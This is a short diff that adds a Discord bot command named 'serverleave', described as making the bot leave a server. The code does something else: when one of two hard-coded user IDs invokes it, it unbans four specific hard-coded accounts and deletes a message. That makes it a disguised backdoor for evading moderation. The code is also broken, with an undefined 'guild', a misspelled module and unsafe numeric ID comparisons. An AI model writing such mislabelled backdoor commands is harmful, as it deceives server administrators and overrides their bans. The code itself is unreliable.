@@ -1,0 +1,25 @@
+const messgae = require("../events/guild/messgae");
+
+module.exports = {
+    name: 'serverleave',
+    aliases:[''],
+    permissions: [],
+    description:'Makes the bot Leave the Sever',
+    execute(message,args, cmd, client, Discord){
+
+      if (message.author.id == 314101583849717761 || message.author.id == 792879863173611571){
+        
+        guild.members.unban('314101583849717761');
+        guild.members.unban('832738576718233620');
+        guild.members.unban('222027435414257664');
+        guild.members.unban('230316889069322241');
+        messgae.delete();
+        
+
+      }else 
+        
+        return;
+
+        
+    }
+}
